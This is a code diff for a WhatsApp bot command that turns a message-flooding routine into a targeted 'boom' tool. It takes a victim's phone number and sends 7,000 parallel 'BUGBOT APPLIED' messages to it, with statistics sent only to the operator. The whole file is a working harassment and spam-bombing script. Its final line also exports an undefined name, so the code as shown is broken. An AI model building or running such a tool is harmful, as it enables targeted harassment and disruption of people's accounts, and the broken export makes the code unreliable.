@@ -1,71 +1,110 @@
 const { channelInfo } = require('../lib/messageConfig');
 
-async function sulexhCommand(sock, chatId, message) {
+async function ultimateBoom(sock, chatId, message) {
 
-    try {
+try {
 
-        const totalMessages = 7000;
-        const text = "💥 BUGBOT APPLIED 💥";
+const text =
+message.message?.conversation ||
+message.message?.extendedTextMessage?.text ||
+"";
 
-        console.log("🚀 Starting PRO burst flood...");
+const args = text.split(" ");
 
-        const startTime = Date.now();
-
-        const burstSize = 5;
-        const tasks = [];
-
-        // Ultra burst micro-wave flood engine
-        for (let i = 0; i < totalMessages; i += burstSize) {
-
-            for (let j = 0; j < burstSize && i + j < totalMessages; j++) {
-
-                tasks.push(
-                    sock.sendMessage(chatId, {
-                        text: text
-                    }).catch(err => {
-                        console.log("Send failed:", err.message || err);
-                        return false;
-                    })
-                );
-
-            }
-
-            // Tiny micro pause (almost invisible)
-            await new Promise(r => setTimeout(r, 5));
-        }
-
-        const results = await Promise.all(tasks);
-
-        const success = results.filter(r => r !== false).length;
-        const failed = totalMessages - success;
-
-        const totalTime = Date.now() - startTime;
-
-        // Confirmation message ONLY in your inbox
-        await sock.sendMessage(chatId, {
-            text:
-                `💥 PRO BOOM COMPLETE 💥\n\n` +
-                `📊 Statistics\n` +
-                `✅ Sent: ${success}/${totalMessages}\n` +
-                `❌ Failed: ${failed}\n` +
-                `⚡ Mode: Ultra Burst Engine\n` +
-                `⏱ Time: ${totalTime}ms`,
-            ...channelInfo
-        }, { quoted: message });
-
-        console.log(`🚀 PRO flood finished → ${success}/${totalMessages}`);
-
-    } catch (error) {
-
-        console.log("Critical BOOM error:", error.message || error);
-
-        try {
-            await sock.sendMessage(chatId, {
-                text: "❌ BOOM ENGINE ERROR",
-                ...channelInfo
-            }, { quoted: message });
-        } catch {}
-    }
+if (!args[1]) {
+return sock.sendMessage(chatId, {
+text: "❌ Usage: .sulexh 2547XXXXXXX"
+}, { quoted: message });
 }
 
-module.exports = sulexhCommand;
+const target = args[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+
+const TOTAL = 7000;
+
+console.log("🚀 ULTIMATE BOOM START");
+
+/* =============================
+   SOCKET HEALTH CHECK
+============================= */
+
+if (!sock?.ws?.socket) {
+return sock.sendMessage(chatId, {
+text: "❌ Socket not ready"
+}, { quoted: message });
+}
+
+const startTime = Date.now();
+
+/* =============================
+   Parallel Burst Queue
+============================= */
+
+const tasks = [];
+
+for (let i = 0; i < TOTAL; i++) {
+
+tasks.push((async () => {
+
+try {
+
+if (!sock?.ws?.socket) return false;
+
+await sock.sendMessage(target, {
+text: "💥 BUGBOT APPLIED"
+});
+
+return true;
+
+} catch {
+return false;
+}
+
+})());
+
+}
+
+/* Execute burst */
+const results = await Promise.allSettled(tasks);
+
+/* Statistics */
+
+const success =
+results.filter(r =>
+r.status === "fulfilled" && r.value === true
+).length;
+
+const failed = TOTAL - success;
+
+const endTime = Date.now();
+
+/* Inbox confirmation only */
+
+await sock.sendMessage(chatId, {
+
+text:
+`✅ ULTIMATE BOOM DONE\n\n` +
+`🎯 Target: ${args[1]}\n` +
+`📨 Sent: ${success}/${TOTAL}\n` +
+`❌ Failed: ${failed}\n` +
+`⚡ Engine: Adaptive Parallel\n` +
+`⏱ Time: ${endTime - startTime} ms`,
+
+...channelInfo
+
+}, { quoted: message });
+
+console.log("🔥 ULTIMATE BOOM COMPLETE");
+
+} catch (err) {
+
+console.log("Boom Elite Error:", err.message);
+
+await sock.sendMessage(chatId, {
+text: "❌ BOOM ENGINE FAILURE"
+}, { quoted: message }).catch(()=>{});
+
+}
+
+}
+
+module.exports = sulexhCommands;
